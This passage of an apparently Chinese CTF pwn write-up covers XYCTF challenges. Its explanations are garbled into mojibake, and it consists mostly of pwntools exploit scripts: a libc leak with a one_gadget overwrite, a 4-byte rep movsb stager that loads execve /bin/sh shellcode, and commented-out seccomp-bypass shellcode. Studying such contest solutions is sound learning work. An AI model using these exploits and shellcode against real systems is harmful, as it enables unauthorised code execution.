    ru<span class="token punctuation">(</span><span class="token string">b&quot;id:\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span>
backdoor <span class="token operator">=</span> <span class="token number">0x40133A</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">b&quot;0&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">b&quot;\x3a\x13\x40&quot;</span><span class="token punctuation">,</span><span class="token string">b&quot;48&quot;</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;index\n&quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;-1&quot;</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;Have a good time!\n&quot;</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span><span class="token string">b&quot;ls&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># print(rl())</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="hello-world" tabindex="-1"><a class="header-anchor" href="#hello-world" aria-hidden="true">#</a> hello_world</h2><blockquote><p>ä¸¤æ¬¡æ ˆæº¢å‡º ç¬¬ä¸€æ¬¡æ³„éœ²libc ç¬¬äºŒæ¬¡ç›´æ¥åŠ«æŒç¨‹åºæµç¨‹one_gadget</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;xyctf.top&quot;</span>
port <span class="token operator">=</span> <span class="token number">35494</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b main&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">b&quot;please input your name: &quot;</span><span class="token punctuation">)</span>
sd<span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token string">b&quot;\x91&quot;</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
baselibc <span class="token operator">=</span> u64<span class="token punctuation">(</span>result<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">47</span> <span class="token operator">-</span><span class="token number">0x29DC0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>baselibc<span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;please input your name: &quot;</span><span class="token punctuation">)</span>
rb<span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x2072</span><span class="token operator">+</span><span class="token number">0x78</span><span class="token operator">+</span>baselibc<span class="token punctuation">)</span>
sd<span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x50a47</span><span class="token operator">+</span>baselibc<span class="token punctuation">)</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="intermittent" tabindex="-1"><a class="header-anchor" href="#intermittent" aria-hidden="true">#</a> Intermittent</h2><blockquote><p>ä¸€æ¬¡æ€§4å­—èŠ‚shellcodeç©ºé—´</p></blockquote><ul><li><p>æœ¬æ¥æƒ³çš„æ˜¯æ¯æ¬¡ç”¨ä¸¤å­—èŠ‚æ“ä½œä¸¤å­—èŠ‚è·³è½¬åˆ°ä¸‹ä¸€ä¸ªå¯æ‰§è¡ŒåŒºåŸŸ å‘ç°ä¸å¤ªç°å®</p></li><li><p>ç„¶åå‘ç°è·³è½¬åˆ°æ‰§è¡Œshellcodeçš„åœ°æ–¹çš„æ—¶å€™å¯„å­˜å™¨ä¸Šå·²ç»å‡ ä¹å¸ƒç½®å¥½äº†ä¸€äº›æˆ‘ä»¬éœ€è¦çš„å€¼</p><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422214330654.png" alt="image-20240422214330654" tabindex="0" loading="lazy"><figcaption>image-20240422214330654</figcaption></figure><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422214400338.png" alt="image-20240422214400338" tabindex="0" loading="lazy"><figcaption>image-20240422214400338</figcaption></figure></li><li><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨rep movsbæŒ‡ä»¤ è¿™ä¸ªæŒ‡ä»¤å¯ä»¥è®©rsiå¯„å­˜å™¨çš„åœ°å€å¼€å§‹rcxçš„å­—èŠ‚æ•°æ®èµ‹å€¼ç»™rdiåœ°å€æ‰€æŒ‡çš„åŒºåŸŸ æˆ‘ä»¬å¯ä»¥å‘ç°rdxå·²ç»æœ‰äº†æˆ‘ä»¬æ‰§è¡Œshellcodeçš„åœ°å€ ç„¶årsiå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²åœ°å€ æˆ‘ä»¬åªéœ€è¦è®©rdxå¯„å­˜å™¨çš„å€¼ç»™rdi ç„¶åè§¦å‘rep movsbå³å¯ å°±å¯ä»¥å®ç°shellcodeçš„å†™å…¥</p></li><li><p>rep movsbæ˜¯ä¸¤å­—èŠ‚ æˆ‘ä»¬ç”¨æ ˆä¼ é€’å‚æ•°è®©rdxèµ‹å€¼ç»™rdi ä¸¤å­—èŠ‚ åˆšå¥½å››å­—èŠ‚ é‚£ä¹ˆæˆ‘ä»¬å­—ç¬¦ä¸²åé¢å¡«ä¸Šgetshellçš„shellcodeå³å¯</p></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
port <span class="token operator">=</span> <span class="token number">1111</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
p <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>file_name<span class="token punctuation">,</span><span class="token string">&quot;b *main+273&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># p = remote(url,port)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">b&quot;show your magic: &quot;</span><span class="token punctuation">)</span>
shellcode1 <span class="token operator">=</span> <span class="token string">b&#39;\x52\x5F\xF3\xA4&#39;</span>
<span class="token comment"># nopæŒ‡ä»¤ä¸é‡è¦</span>
shellcode2 <span class="token operator">=</span> <span class="token string">b&#39;\x90&#39;</span><span class="token operator">*</span><span class="token number">4</span>
shellcode3 <span class="token operator">=</span> <span class="token string">b&#39;\x90&#39;</span><span class="token operator">*</span><span class="token number">4</span>
shellcode <span class="token operator">=</span> shellcode1 <span class="token operator">+</span><span class="token string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span>
sd<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b&quot;\x90&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="inviisible-flag" tabindex="-1"><a class="header-anchor" href="#inviisible-flag" aria-hidden="true">#</a> inviisible_flag</h2><blockquote><p>ç¦æ­¢äº†orwçš„orw æˆ‘ä»¬ç›´æ¥ä½¿ç”¨å¹³æ›¿å‡½æ•° <br><a href="https://syscalls.mebeim.net/?table=x86/64/x64/v6.5" target="_blank" rel="noopener noreferrer">æ–°å»ºæ ‡ç­¾é¡µ (mebeim.net)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>æ¨èè¿™ä¸ªç½‘ç«™è¿›è¡ŒæŸ¥çœ‹æœ‰å“ªäº›å‡½æ•°å’Œä¼ å‚è§„èŒƒ</p></blockquote><ul><li>å…ˆå¼€å§‹æƒ³å¤æ‚äº† æƒ³æˆäº†åˆ©ç”¨retfqæ¥è½¬åŒ–ä¸º32ä½ç»•è¿‡openç­‰å‡½æ•°çš„ç¦æ­¢ å‚è€ƒå¼ºç½‘æ¯çš„shellcode<a href="https://ctf.bugku.com/writeup/detail/id/429.html" target="_blank" rel="noopener noreferrer">ç¬¬äº”å±Šå¼ºç½‘æ¯ Pwn - shellcode - Bugku CTF<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>è¿˜æ˜¯å­¦åˆ°äº†ä¸œè¥¿ ç”šè‡³å»æƒ³åŠæ³•è§¦å‘æ–°çš„mmapå‡½æ•°æ¥è·å–ä¸€ä¸ªä½åœ°å€çš„å¯æ‰§è¡ŒåŒºåŸŸ ç„¶åæŠŠshellcode copyè¿‡å»æ‰§è¡Œ å› ä¸ºrefqä¸æ”¯æŒè·³è½¬è¶…è¿‡å››å­—èŠ‚çš„åœ°å€ ç»“æœå‘ç°æƒ³å¤æ‚äº† è¿™é‡Œä¿ç•™äº†åŸæœ¬çš„æ„æ€ä»£ç </li><li>tips:<code>sendfile64</code>(è°ƒç”¨å·:0x28)å¯ä»¥ç›´æ¥è®©ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„å†…å®¹è¾“å‡ºåˆ°å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šéå¸¸é€‚åˆå¹³æ›¿è¿™æ¬¡çš„writeå‡½æ•°</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>

<span class="token comment"># shellcode_copy = asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># copy_loop:</span>
<span class="token comment"># cmp rcx, 0</span>
<span class="token comment"># je end_copy                </span>
<span class="token comment"># mov al, [rsi]              </span>
<span class="token comment"># mov [rdi], al               </span>
<span class="token comment"># inc rsi                    </span>
<span class="token comment"># inc rdi                    </span>
<span class="token comment"># dec rcx                     </span>
<span class="token comment"># jmp copy_loop</span>
<span class="token comment"># end_copy:       </span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;amd64&quot;)</span>
file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;xyctf.top&quot;</span>
port <span class="token operator">=</span><span class="token number">35002</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+181&quot;)</span>
<span class="token comment"># b 0x114514061 </span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *0x114514061&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># ru(b&quot;show your magic again\n&quot;)</span>
<span class="token comment"># # retfq ç­‰æ•ˆä¸º</span>
<span class="token comment"># # pop IP</span>
<span class="token comment"># # pop CS</span>

<span class="token comment"># # retfqæ— æ³•è·³è½¬4å­—èŠ‚ä»¥ä¸Šçš„åœ°å€</span>

<span class="token comment"># # å°è¯•forkä¸€ä¸ªæ–°è¿›ç¨‹</span>
<span class="token comment"># # putså‡½æ•°</span>
<span class="token comment"># # 0x114514000</span>
<span class="token comment"># # \x00 \x40 \x51 \x13  cs:\x01</span>

<span class="token comment"># # eip rip cs:ip</span>
<span class="token comment"># # retfq -&gt;csä½0x23 ip</span>

<span class="token comment"># # mov rax,[rbp+24]</span>
<span class="token comment"># # add rax,80</span>
<span class="token comment"># # jmp rax</span>
<span class="token comment"># # 0x11451404d -&gt;0x14514000 57æ¬¡</span>
<span class="token comment"># # </span>

<span class="token comment"># # b *0x114514061 </span>

<span class="token comment"># shellcode = asm(&#39;&#39;&#39;</span>
<span class="token comment"># mov r9d,0x0</span>
<span class="token comment"># mov r8d,0xffffffff</span>
<span class="token comment"># mov ecx,0x22</span>
<span class="token comment"># mov edx,0x7</span>
<span class="token comment"># mov esi,0x1000</span>
<span class="token comment"># movabs rax,0x14514000</span>
<span class="token comment"># mov rdi,rax </span>
<span class="token comment"># mov rax,[rbp+24]</span>
<span class="token comment"># sub rax,647</span>
<span class="token comment"># call rax</span>
<span class="token comment"># &#39;&#39;&#39;,arch=&quot;amd64&quot;)</span>
<span class="token comment"># # å°†å†…å®¹èµ‹å€¼è¿‡å»</span>

<span class="token comment"># shellcode += asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># mov rsi,0x11451406a; </span>
<span class="token comment"># mov rdi,0x14514000;</span>
<span class="token comment"># mov rcx,456     </span>

<span class="token comment"># copy_loop:</span>
<span class="token comment">#   cmp rcx, 0</span>
<span class="token comment">#   je end_copy                 ; </span>
<span class="token comment">#   mov al, [rsi]               ; </span>
<span class="token comment">#   mov [rdi], al               ; </span>
<span class="token comment">#   inc rsi                     ; </span>
<span class="token comment">#   inc rdi                     ; </span>
<span class="token comment">#   dec rcx                     ; </span>
<span class="token comment">#   jmp copy_loop               ; </span>

<span class="token comment"># end_copy:</span>
<span class="token comment">#     mov rax,0x14514000</span>
<span class="token comment">#     jmp rax</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;amd64&quot;)</span>
<span class="token comment"># # è½¬åŒ–ä¸º32ä½</span>
<span class="token comment"># shellcode +=asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># push 0x23</span>
<span class="token comment"># push 0x14514009</span>
<span class="token comment"># retfq</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;amd64&quot;)</span>
<span class="token comment"># # æ„é€ æ ˆ</span>
<span class="token comment"># shellcode += asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># mov esp,0x14514400</span>
<span class="token comment"># mov ebp,0x14514420</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;i386&quot;)</span>
<span class="token comment"># # è°ƒç”¨openå‡½æ•°</span>
<span class="token comment"># shellcode += asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># xor eax, eax ; </span>
<span class="token comment"># mov eax,0x5 ;</span>
<span class="token comment"># push 0x00006761;</span>
<span class="token comment"># push 0x6c662f2e;</span>
<span class="token comment"># mov ebx,esp;</span>
<span class="token comment"># mov edi,esp; </span>
<span class="token comment"># mov ecx, 0;  </span>
<span class="token comment"># int 0x80; </span>
<span class="token comment"># &#39;&#39;&#39;,arch=&quot;i386&quot;)</span>
<span class="token comment"># # read</span>
<span class="token comment"># shellcode += asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># mov ebx,3;</span>
<span class="token comment"># mov ecx,esp;</span>
<span class="token comment"># mov edx,0x20;</span>
<span class="token comment"># mov eax,0x3;</span>
<span class="token comment"># int 0x80;</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># ,arch=&quot;i386&quot;)</span>
<span class="token comment"># # write</span>
<span class="token comment"># shellcode +=asm(</span>
<span class="token comment"># &#39;&#39;&#39;</span>
<span class="token comment"># mov ebx,1;</span>
<span class="token comment"># mov ecx,esp;</span>
<span class="token comment"># mov edx,0x20;</span>
<span class="token comment"># mov eax,0x4;</span>
